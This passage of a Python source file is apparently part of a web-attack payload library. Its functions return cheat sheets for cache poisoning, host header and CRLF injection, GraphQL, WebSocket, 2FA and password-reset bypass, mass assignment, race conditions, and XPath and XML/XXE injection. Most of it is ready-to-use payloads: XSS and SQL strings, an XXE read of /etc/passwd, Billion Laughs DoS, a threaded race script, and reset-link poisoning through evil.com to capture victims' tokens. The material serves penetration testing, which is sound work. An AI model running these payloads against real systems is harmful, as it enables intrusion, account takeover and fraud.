X-Forwarded-Proto:
X-Forwarded-Proto: http
Result: Force HTTP redirect

EXPLOITATION:

Stored XSS via cache:
1. Request with: X-Forwarded-Host: evil.com"><script>alert(1)</script>
2. Response cached with XSS
3. All users get XSS

Resource poisoning:
X-Forwarded-Host: evil.com
Cached: <link href="//evil.com/style.css">
All users load malicious CSS/JS

Open redirect via cache:
X-Forwarded-Host: evil.com
Cached: Location: https://evil.com/redirect

DETECTION:

1. Identify cached resources
2. Test unkeyed headers
3. Verify cache hit
4. Poison cache
5. Verify persistence

Cache-Control headers:
Look for: Cache-Control: public, max-age=3600

Vary header:
Vary: User-Agent (keyed)
Missing headers = unkeyed

TESTING:
☐ X-Forwarded-Host
☐ X-Forwarded-Proto
☐ X-Forwarded-Scheme
☐ X-Original-URL
☐ X-Rewrite-URL
☐ X-Host
☐ Forwarded"""


def generate_web_cache_deception():
    """Web cache deception payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              🎭 WEB CACHE DECEPTION PAYLOADS                     ║
╚══════════════════════════════════════════════════════════════════╝

BASIC TECHNIQUE:

1. Send victim to:
https://target.com/account.php/nonexistent.css

2. Server processes: /account.php
3. Cache sees: nonexistent.css (static file)
4. Response cached

5. Attacker visits same URL
6. Gets victim's account page from cache

VARIATIONS:

Path variations:
/account.php/static.css
/account.php/style.css
/account.php/image.jpg
/account.php/script.js

Encoded paths:
/account.php%2Fstatic.css
/account.php%0Astatic.css

Query strings:
/account.php?param=value.css
/account.php?cache.css

Delimiter manipulation:
/account.php;static.css
/account.php%3Bstatic.css

EXPLOITATION:

Steal API keys:
/api/keys/token.js

Steal session tokens:
/auth/session/cache.css

Steal personal data:
/profile/info.jpg

DETECTION:

1. Find authenticated pages
2. Append static extension
3. Check if cached
4. Access from different session

TESTING:
☐ User profiles
☐ Account settings
☐ API endpoints
☐ Dashboard
☐ Admin panels"""


def generate_host_header_attacks():
    """Host header attack payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🌐 HOST HEADER ATTACK PAYLOADS                   ║
╚══════════════════════════════════════════════════════════════════╝

BASIC INJECTION:
Host: evil.com
Host: attacker.com
Host: 127.0.0.1

PASSWORD RESET POISONING:
1. Request password reset for victim@target.com
2. Inject Host: evil.com
3. Reset link: http://evil.com/reset?token=VICTIM_TOKEN
4. Capture token when victim clicks

WEB CACHE POISONING:
Host: evil.com
Cached response: <script src="//evil.com/app.js">

SSRF VIA HOST:
Host: 169.254.169.254
Host: localhost
Host: 127.0.0.1

VIRTUAL HOST CONFUSION:
Host: internal.target.com
Host: admin.target.com

PORT MANIPULATION:
Host: target.com:22
Host: target.com:8080

DOUBLE HOST HEADERS:
Host: target.com
Host: evil.com

ABSOLUTE URI:
GET http://evil.com/ HTTP/1.1
Host: target.com

LINE WRAPPING:
Host: target.com
 evil.com

SUBDOMAIN CONFUSION:
Host: target.com.evil.com
Host: target.com@evil.com

X-FORWARDED-HOST:
Host: target.com
X-Forwarded-Host: evil.com

OTHER HEADERS:
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com"""


def generate_hpp_attacks():
    """HTTP Parameter Pollution attacks"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║            🔀 HTTP PARAMETER POLLUTION PAYLOADS                  ║
╚══════════════════════════════════════════════════════════════════╝

BASIC HPP:

URL: /page?param=value1&param=value2

Server interpretation varies:
- Apache/PHP: value2 (last wins)
- JSP/Tomcat: value1 (first wins)
- ASP.NET: value1,value2 (concatenated)
- Perl/CGI: value1 (first wins)

BYPASS WAF:

Split SQL injection:
?id=1&id=' OR '1'='1

?user=admin&user=' OR '1'='1'--

BYPASS FILTERS:

Authentication:
?user=victim&user=admin

Authorization:
?role=user&role=admin

CSRF TOKEN BYPASS:

?csrf_token=valid&csrf_token=invalid
(If first wins, valid token processed)

OVERRIDE PARAMETERS:

Price manipulation:
?price=1000&price=1

User selection:
?user_id=1&user_id=999

INJECTION ATTACKS:

XSS split:
?search=<script&search=>alert(1)</script>

SQL split:
?id=1' OR '1&id='1

TESTING:
☐ URL parameters
☐ POST body
☐ JSON arrays
☐ Cookie values
☐ HTTP headers"""


def generate_crlf_injection():
    """CRLF injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  📜 CRLF INJECTION PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

BASIC CRLF:
%0d%0a
%0d%0a%0d%0a
%0d
%0a

SET-COOKIE INJECTION:
?param=value%0d%0aSet-Cookie:%20admin=true

LOCATION REDIRECT:
?url=value%0d%0aLocation:%20https://evil.com

RESPONSE SPLITTING:
?param=value%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

XSS VIA CRLF:
?redirect=/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

CACHE POISONING:
?param=value%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK

SESSION FIXATION:
?id=123%0d%0aSet-Cookie:%20sessionid=attacker_session

EMAIL HEADER INJECTION:
Subject: Test%0d%0aBcc:%20attacker@evil.com

VARIATIONS:
%0d%0a (CRLF)
%0d (CR)
%0a (LF)
%0d%0d%0a (CRCRLF)
\r\n (literal)

DOUBLE ENCODING:
%250d%250a

BYPASS FILTERS:
%0d (CR only)
%0a (LF only)
%E5%98%8A%E5%98%8D (UTF-7)"""


def generate_graphql_methodology():
    """GraphQL security testing"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🎯 GRAPHQL SECURITY TESTING                      ║
╚══════════════════════════════════════════════════════════════════╝

INTROSPECTION:

query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}

INJECTION:

SQL Injection:
{user(id: "1' OR '1'='1") {name email}}

NoSQL Injection:
{user(id: {"$ne": null}) {name email}}

IDOR:
{user(id: "1") {name email ssn}}
{user(id: "2") {name email ssn}}

BATCHING ATTACKS:

[
  {query: "query{user(id:1){name}}"},
  {query: "query{user(id:2){name}}"},
  {query: "query{user(id:3){name}}"}
]

DOS via NESTED QUERIES:

{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}

FIELD DUPLICATION:

{
  user(id: "1") {
    name name name name name
    email email email email
  }
}

MUTATION ATTACKS:

mutation {
  updateUser(id: "1", role: "admin") {
    id role
  }
}

BYPASS AUTHENTICATION:

{
  __type(name: "User") {
    fields {
      name
    }
  }
}"""


def generate_graphql_payloads():
    """GraphQL attack payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🔱 GRAPHQL ATTACK PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

INTROSPECTION QUERIES:

Full schema:
{__schema{types{name,fields{name,args{name,type{name}}}}}}

Query types:
{__schema{queryType{name,fields{name}}}}

Mutation types:
{__schema{mutationType{name,fields{name}}}}

INFORMATION DISCLOSURE:

All users:
{users{id name email password}}

Specific user:
{user(id:"1"){id name email ssn creditCard}}

IDOR:
{user(id:"1"){privateData}}
{user(id:"2"){privateData}}

INJECTION:

SQL:
{user(id:"1' OR '1'='1"){name}}

NoSQL:
{user(filter:{email:{$ne:null}}){email password}}

XSS:
mutation{createPost(title:"<script>alert(1)</script>"){id}}

BATCHING:

POST /graphql
[
  {"query":"query{user(id:1){email}}"},
  {"query":"query{user(id:2){email}}"},
  {"query":"query{user(id:3){email}}"}
]

NESTED QUERY DOS:

{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              text
            }
          }
        }
      }
    }
  }
}

ALIAS DOS:

{
  user1: user(id:"1"){name}
  user2: user(id:"1"){name}
  user3: user(id:"1"){name}
  ...
  user1000: user(id:"1"){name}
}

MUTATIONS:

Update user:
mutation{updateUser(id:"1",role:"admin"){id role}}

Delete data:
mutation{deleteUser(id:"2"){success}}

Create admin:
mutation{createUser(username:"hacker",role:"admin"){id}}

BYPASS RATE LIMITING:

Use aliases to make multiple requests in one query

BYPASS AUTHENTICATION:

Introspection when auth bypassed:
{__schema{types{name}}}"""


def generate_websocket_attacks():
    """WebSocket security testing"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🔌 WEBSOCKET SECURITY TESTING                    ║
╚══════════════════════════════════════════════════════════════════╝

CONNECTION HIJACKING:

Lack of origin validation:
var ws = new WebSocket('wss://target.com/ws');
ws.send('malicious data');

CSRF:

<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send('{"action":"transfer","amount":1000,"to":"attacker"}');
};
</script>

INJECTION:

XSS via WebSocket:
ws.send('{"message":"<script>alert(1)</script>"}');

SQL Injection:
ws.send('{"username":"admin\' OR \'1\'=\'1"}');

Command Injection:
ws.send('{"cmd":"ls; whoami"}');

MESSAGE MANIPULATION:

Intercept and modify:
Original: {"type":"user","id":"123"}
Modified: {"type":"admin","id":"123"}

REPLAY ATTACKS:

Capture valid message:
{"action":"buy","item":"premium","user":"victim"}

Replay for attacker:
{"action":"buy","item":"premium","user":"attacker"}

DOS:

Flood messages:
for(let i=0;i<10000;i++){
  ws.send('spam');
}

TESTING:

Connect:
var ws = new WebSocket('wss://target.com/ws');

Send message:
ws.send('test');

Receive:
ws.onmessage = function(e){console.log(e.data);}

Close:
ws.close();

TOOLS:
- Burp Suite (WebSocket History)
- WS-Attacker
- wscat
- websocat"""


def generate_api_security():
    """API security testing"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                   🔐 API SECURITY TESTING                        ║
╚══════════════════════════════════════════════════════════════════╝

AUTHENTICATION:

API Key in URL:
GET /api/users?api_key=SECRET

API Key in Header:
GET /api/users
X-API-Key: SECRET

Bearer Token:
Authorization: Bearer TOKEN

Basic Auth:
Authorization: Basic base64(user:pass)

AUTHORIZATION:

IDOR in API:
GET /api/user/1
GET /api/user/2

Privilege escalation:
PUT /api/user/1
{"role": "admin"}

Mass assignment:
POST /api/user
{"email":"test@test.com","is_admin":true}

INJECTION:

SQL:
GET /api/users?id=1' OR '1'='1

NoSQL:
POST /api/login
{"username":{"$ne":null},"password":{"$ne":null}}

XSS:
POST /api/comment
{"text":"<script>alert(1)</script>"}

RATE LIMITING:

Bypass:
- Remove rate limit headers
- Use X-Forwarded-For: 127.0.0.1
- Rotate User-Agent
- Use different endpoints

INFORMATION DISCLOSURE:

Verbose errors:
DELETE /api/user/1
Response: "SQL Error: Table users..."

API documentation:
/api/docs
/api/swagger.json
/api/v1/swagger.json
/api-docs

VERSION DISCOVERY:
/api/v1/users
/api/v2/users
/api/v3/users

MASS ENUMERATION:

Batch requests:
POST /api/batch
[
  {"method":"GET","url":"/user/1"},
  {"method":"GET","url":"/user/2"}
]

TESTING:
☐ Authentication bypass
☐ Broken authorization
☐ Excessive data exposure
☐ Lack of rate limiting
☐ Injection flaws
☐ Mass assignment
☐ Security misconfiguration
☐ Insufficient logging"""


def generate_business_logic():
    """Business logic vulnerability testing"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║             🧠 BUSINESS LOGIC VULNERABILITIES                    ║
╚══════════════════════════════════════════════════════════════════╝

PRICE MANIPULATION:

Negative quantity:
quantity=-1&price=100
Total: -100 (credit to account)

Tamper with price:
POST /checkout
{"items":[{"id":1,"price":1000}]}
Modified: {"items":[{"id":1,"price":1}]}

Currency confusion:
price=100&currency=USD
Modified: currency=IDR (Indonesian Rupiah)

COUPON ABUSE:

Reuse coupon:
Apply same coupon multiple times

Stack coupons:
coupon1=SAVE10&coupon2=SAVE20

Race condition:
Send 10 simultaneous requests with same coupon

INVENTORY MANIPULATION:

Negative stock:
Buy items when stock=0
Modify quantity to negative

WORKFLOW BYPASS:

Skip payment:
1. Add to cart
2. Go to confirmation (skip payment)
3. Modify order status to "paid"

Skip verification:
1. Create account
2. Change is_verified=true before email verification

AUTHENTICATION LOGIC:

Reset any password:
1. Request reset for victim@target.com
2. Intercept request
3. Change email to attacker@evil.com
4. Get reset token for victim account

2FA bypass:
1. Login with correct password
2. When prompted for 2FA
3. Change URL or modify response
4. Bypass 2FA step

PRIVILEGE ESCALATION:

Parameter tampering:
user_type=regular → user_type=admin
role=user → role=admin

Account takeover:
1. Create account
2. Request password reset
3. Token not expired after password change
4. Use old token to reset again

REFERRAL FRAUD:

Self-referral:
Refer yourself for bonus

Fake referrals:
Create multiple accounts
Refer each other

RACE CONDITIONS:

Gift card:
1. Have $100 gift card
2. Make 10 simultaneous $100 purchases
3. All might succeed = $1000 spent

Vote manipulation:
Send 1000 simultaneous votes

LOGIC FLAWS:

Rounding errors:
Transfer $0.001 one million times

Time manipulation:
Change system time for time-based restrictions

Integer overflow:
Set quantity to 2147483647"""


def generate_2fa_bypass():
    """2FA bypass techniques"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🔐 2FA BYPASS TECHNIQUES                        ║
╚══════════════════════════════════════════════════════════════════╝

DIRECT BYPASS:

Skip 2FA page:
1. Login with correct password
2. When redirected to 2FA
3. Change URL to /dashboard
4. Access granted without 2FA

Response manipulation:
{"2fa_required":true} → {"2fa_required":false}
{"2fa_passed":false} → {"2fa_passed":true}

NULL/Empty OTP:
otp=
otp=null
otp=0

BRUTE FORCE:

4-digit OTP:
0000-9999 (10,000 attempts)

6-digit OTP:
000000-999999 (1,000,000 attempts)

Rate limit bypass:
- Use X-Forwarded-For
- Rotate IP
- Multiple sessions

BACKUP CODES:

Unlimited generation:
Generate backup codes multiple times

Reuse codes:
Try same backup code multiple times

No expiration:
Old backup codes still valid

OTP REUSE:

Same OTP valid for multiple sessions
Same OTP valid after logout/login

TOKEN LEAK:

OTP in response:
{"message":"OTP sent","otp":"123456"}

OTP in referrer:
/verify-2fa?otp=123456

OTP in email subject:
Subject: Your OTP is 123456

PASSWORD RESET:

Reset password bypasses 2FA:
1. Request password reset
2. Change password
3. Login without 2FA

SESSION FIXATION:

1. Login without 2FA
2. Get session cookie
3. Fix victim session
4. Victim completes 2FA
5. Attacker uses session

REMEMBER ME:

"Remember this device" persistent
Cookie manipulation:
remember_device=true

RACE CONDITION:

1. Request OTP
2. Submit wrong OTP 1000 times simultaneously
3. One might succeed

PARAMETER TAMPERING:

user_id=1 → user_id=2
phone=+1234567890 → phone=attacker_phone

TESTING:
☐ Direct bypass
☐ Response manipulation
☐ Brute force OTP
☐ Backup codes abuse
☐ OTP reuse
☐ Password reset bypass
☐ Rate limiting
☐ Remember device"""


def generate_password_reset():
    """Password reset vulnerabilities"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║             🔑 PASSWORD RESET VULNERABILITIES                    ║
╚══════════════════════════════════════════════════════════════════╝

TOKEN MANIPULATION:

Weak token:
token=123456 (sequential)
token=userid_timestamp (predictable)

Token leak:
Referrer: /reset?token=SECRET
Response: {"message":"success","token":"SECRET"}

Token not expired:
Use old token after password change

PARAMETER TAMPERING:

Email parameter:
POST /reset
{"email":"victim@target.com"}
Modified: {"email":"attacker@evil.com"}

User ID:
/reset?token=TOKEN&user_id=1
Modified: user_id=2

ACCOUNT TAKEOVER:

Multiple emails:
POST /reset
{"email":"victim@target.com, attacker@evil.com"}

Array:
{"email":["victim@target.com","attacker@evil.com"]}

Host header poisoning:
Host: evil.com
Reset link: http://evil.com/reset?token=VICTIM_TOKEN

BRUTE FORCE:

Weak token:
4-digit: 0000-9999
6-digit: 000000-999999

No rate limit:
Try all possible tokens

BYPASS VERIFICATION:

Skip email verification:
1. Request reset
2. Don't click email
3. Access /reset-password directly with guessed token

Response manipulation:
{"email_sent":false} → {"email_sent":true}

TOKEN REUSE:

Same token for multiple accounts:
Request reset for user1
Use same token for user2

RACE CONDITION:

Send multiple reset requests:
Flood /reset endpoint
One might bypass rate limit

INFORMATION DISCLOSURE:

Different responses:
"Email sent" (user exists)
"Email not found" (no user)
= User enumeration

TESTING:
☐ Token predictability
☐ Token expiration
☐ Token reuse
☐ Rate limiting
☐ Email parameter tampering
☐ User enumeration
☐ Host header poisoning
☐ Multiple recipients"""


def generate_mass_assignment():
    """Mass assignment vulnerabilities"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              📝 MASS ASSIGNMENT VULNERABILITIES                  ║
╚══════════════════════════════════════════════════════════════════╝

PRIVILEGE ESCALATION:

User registration:
POST /register
{"email":"test@test.com","password":"pass"}

Add admin field:
{"email":"test@test.com","password":"pass","is_admin":true}

Add role:
{"email":"test@test.com","password":"pass","role":"admin"}

ACCOUNT TAKEOVER:

Update profile:
POST /profile
{"name":"John"}

Add email change:
{"name":"John","email":"attacker@evil.com"}

PRICE MANIPULATION:

Checkout:
POST /checkout
{"item_id":1}

Add price:
{"item_id":1,"price":1}

BYPASS RESTRICTIONS:

Create post:
POST /post
{"title":"Test","content":"..."}

Add published:
{"title":"Test","content":"...","published":true,"featured":true}

COMMON VULNERABLE FIELDS:

User object:
- is_admin
- is_verified
- role
- privileges
- account_type
- user_type
- is_active
- email_verified

Product object:
- price
- discount
- stock
- is_featured
- is_published

Order object:
- status
- total_price
- paid
- shipped

TESTING METHODOLOGY:

1. Identify endpoints accepting JSON/form data
2. Find object models
3. Add extra fields
4. Test response

Common patterns:
{"field":"value","hidden_field":"malicious"}
{"field":"value","is_admin":true}
{"field":"value","role":"admin"}

TOOLS:

Burp Suite:
- Intercept request
- Add parameters
- Forward

Param Miner:
- Discover hidden parameters
- Test mass assignment

TESTING:
☐ User registration
☐ Profile updates
☐ Product creation
☐ Order placement
☐ Settings changes
☐ Password resets
☐ API endpoints"""


def generate_race_condition():
    """Race condition attack testing"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              ⚡ RACE CONDITION ATTACK TESTING                    ║
╚══════════════════════════════════════════════════════════════════╝

METHODOLOGY:

1. Identify state-changing operations
2. Find race windows
3. Craft simultaneous requests
4. Verify exploitation

COMMON VULNERABILITIES:

Gift card balance:
1. Have $100 balance
2. Make 10 simultaneous $100 purchases
3. All succeed = spent $1000

Coupon reuse:
1. Apply DISCOUNT50 coupon
2. Send 20 simultaneous requests
3. Coupon applied 20 times

Vote/Like:
1. Vote on poll
2. Send 1000 simultaneous votes
3. All votes counted

File upload:
1. Upload shell.php
2. Access immediately before validation
3. Execute before deletion

Password reset:
1. Request reset
2. Use token
3. Request reset again simultaneously
4. Both tokens valid

EXPLOITATION:

Burp Suite:
1. Send to Repeater
2. Create 20 tabs (Ctrl+D)
3. Send group in parallel

Python script:
import requests
import threading

def send_request():
    requests.post('http://target.com/action', data={'param':'value'})

threads = []
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

HTTP/2 single-packet:
Send all requests in one TCP packet

DETECTION:

Time-of-check to time-of-use (TOCTOU):
1. Check if balance >= 100
2. [Race window]
3. Deduct 100

TESTING SCENARIOS:

☐ Financial transactions
☐ Coupon/discount codes
☐ Gift card operations
☐ Voting systems
☐ Inventory management
☐ File uploads
☐ Account operations
☐ Rate limiting
☐ Token generation
☐ Database operations"""


def generate_xpath_injection():
    """XPath injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🔍 XPATH INJECTION PAYLOADS                     ║
╚══════════════════════════════════════════════════════════════════╝

AUTHENTICATION BYPASS:

' or '1'='1
' or 1=1 or ''='
admin' or '1'='1
') or ('1'='1
admin')] | //user/* | a[('1'='1

BOOLEAN-BASED EXTRACTION:

' or //user[1]/name='admin
' or //user[1]/password='test

Count users:
' or count(//user)>5 or '1'='1

DATA EXTRACTION:

Extract usernames:
' or //user[position()=1]/name or '1'='1
' or //user[position()=2]/name or '1'='1

Extract passwords:
' or substring(//user[1]/password,1,1)='a

Length:
' or string-length(//user[1]/password)=8 or '1'='1

BLIND XPATH:

Character by character:
' and substring(//user[1]/password,1,1)='a
' and substring(//user[1]/password,1,1)='b

XPATH FUNCTIONS:

name()
string()
substring()
string-length()
count()
position()

TESTING:
username: ' or '1'='1
password: ' or '1'='1"""


def generate_xml_injection():
    """XML injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                   📄 XML INJECTION PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

XML STRUCTURE MANIPULATION:

Original:
<user>
  <name>John</name>
  <role>user</role>
</user>

Inject:
<name>John</name><role>admin</role><x>

Result:
<user>
  <name>John</name><role>admin</role><x></name>
  <role>user</role>
</user>

XSS VIA XML:

<name><![CDATA[<script>alert(1)</script>]]></name>
<name>&lt;script&gt;alert(1)&lt;/script&gt;</name>

SQL INJECTION VIA XML:

<username>' OR '1'='1</username>
<password>' OR '1'='1</password>

XXE (External Entity):

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

XPATH INJECTION:

<username>admin' or '1'='1</username>

DENIAL OF SERVICE:

Billion Laughs:
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol1;</lolz>

CDATA ESCAPE:

<data><![CDATA[]]>malicious]]></data>

TESTING:
☐ SOAP requests
☐ XML APIs
☐ RSS feeds
☐ SAML authentication
☐ Configuration files"""


# ============================================================================
# EXPORT FUNCTION
# ============================================================================


def get_all_payloads():
    """Return dictionary of all available payloads organized by category"""
    return {
        "🌐 Injection Attacks": {
            "XSS - Complete Methodology": generate_xss_methodology,
            "XSS - Payload Library": generate_xss_payloads,
            "SQL Injection - Methodology": generate_sql_methodology,
            "SQL Injection - Payloads": generate_sql_payloads,
            "NoSQL Injection": generate_nosql_injection,
            "LDAP Injection": generate_ldap_injection,
            "Command Injection": generate_command_injection,
            "XPath Injection": generate_xpath_injection,
            "XML Injection": generate_xml_injection,
            "SSTI - Methodology": generate_ssti_methodology,
            "SSTI - Payloads": generate_ssti_payloads,
        },
        "🖥️ Server-Side Attacks": {
            "XXE - Methodology": generate_xxe_methodology,
            "XXE - Payloads": generate_xxe_payloads,
            "SSRF - Methodology": generate_ssrf_methodology,
            "SSRF - Payloads": generate_ssrf_payloads,
            "Deserialization": generate_deserialization,
            "LFI / Path Traversal": generate_lfi_payloads,
            "File Upload Bypass": generate_file_upload_bypass,
        },
        "🔐 Authentication & Authorization": {
            "Authentication Bypass": generate_auth_bypass,
            "JWT Attacks": generate_jwt_attacks,
            "IDOR": generate_idor_payloads,
            "Session Attacks": generate_session_attacks,
            "2FA Bypass": generate_2fa_bypass,
            "Password Reset Flaws": generate_password_reset,
        },
        "🔄 Cross-Site Attacks": {
            "CSRF - Methodology": generate_csrf_methodology,
            "CSRF - Payloads": generate_csrf_payloads,
            "CORS Misconfiguration": generate_cors_methodology,
            "Clickjacking": generate_clickjacking,
            "Open Redirect": generate_open_redirect,
        },
        "🌐 Advanced Web Attacks": {
            "HTTP Request Smuggling": generate_http_request_smuggling,
            "Cache Poisoning": generate_cache_poisoning,
            "Web Cache Deception": generate_web_cache_deception,
            "Host Header Attacks": generate_host_header_attacks,
            "HTTP Parameter Pollution": generate_hpp_attacks,
            "CRLF Injection": generate_crlf_injection,
        },
        "📡 API & Modern Web": {
            "GraphQL - Methodology": generate_graphql_methodology,
            "GraphQL - Payloads": generate_graphql_payloads,
            "WebSocket Attacks": generate_websocket_attacks,
            "API Security": generate_api_security,
        },
        "🧠 Business Logic": {
            "Business Logic Flaws": generate_business_logic,
            "Race Conditions": generate_race_condition,
            "Mass Assignment": generate_mass_assignment,
        },
    }


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def get_payload_by_name(name):
    """Get a specific payload function by name"""
    all_payloads = get_all_payloads()
    for category, payloads in all_payloads.items():
        for payload_name, payload_func in payloads.items():
            if payload_name == name:
                return payload_func()
    return None


def get_category_payloads(category):
    """Get all payloads from a specific category"""
    all_payloads = get_all_payloads()
    return all_payloads.get(category, {})


def search_payloads(keyword):
    """Search for payloads containing keyword"""
    results = []
    all_payloads = get_all_payloads()
    keyword_lower = keyword.lower()

    for category, payloads in all_payloads.items():
        for payload_name, payload_func in payloads.items():
            if keyword_lower in payload_name.lower():
                results.append((category, payload_name, payload_func))

    return results
